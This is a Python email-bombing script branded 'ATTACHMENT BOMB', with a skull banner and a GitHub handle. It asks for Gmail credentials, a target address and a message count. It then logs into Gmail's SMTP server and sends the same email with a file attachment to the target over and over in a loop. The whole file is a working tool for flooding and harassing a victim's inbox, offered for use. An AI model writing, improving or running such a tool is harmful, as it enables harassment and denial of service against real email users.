from pystyle import Colorate, Colors
import os
import smtplib
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.red_to_white, """
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |           
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
                              
----------------------------------------
Type : ATTACHMENT BOMB
Revolt : https://rvlt.gg/wqXBTNNB
Github : https://github.com/madanokr001
----------------------------------------           
                """))
def send_email_attachment(sender_email, password, recv_email, message, total_messages, subject, file_path):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls() 
        server.login(sender_email, password)  

        for i in range(int(total_messages)):
            msg = MIMEMultipart()  
            msg['From'] = sender_email
            msg['To'] = recv_email
            msg['Subject'] = subject
            msg.attach(MIMEText(message, 'plain'))

            with open(file_path, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
                msg.attach(part)

            server.sendmail(sender_email, recv_email, msg.as_string())
            print(Colorate.Horizontal(Colors.red_to_white, f"[+] EMAIL - BOMBER : {recv_email} TOTAL : {i+1}/{total_messages}"))

        server.quit()  
        print(Colorate.Horizontal(Colors.red_to_white, "[*] FINISH.."))

    except smtplib.SMTPAuthenticationError:
        print(Colorate.Horizontal(Colors.red_to_white, "[-] Error? click link : https://support.google.com/mail/answer/185833?hl=en"))


def email_attachment_main():
    logo()
    sender_email = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@SENDER-EMAIL]
║
║═══> 
"""))
  
    password = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@APP-PASSWORD]
║
║═══> 
"""))

    recv_email = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@TARGET-EMAIL]
║
║═══> 
"""))
    subject = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@SUBJECT]
║
║═══> 
"""))
    message = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@MESSAGE]
║
║═══> 
"""))
    total_messages = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@TOTAL-MESSAGE]
║
║═══> 
"""))
    file_path = input(Colorate.Horizontal(Colors.red_to_white, """
╔═══[root@FILE-PATH.jpg]
║
║═══> 
"""))

    send_email_attachment(sender_email, password, recv_email, message, total_messages, subject, file_path)
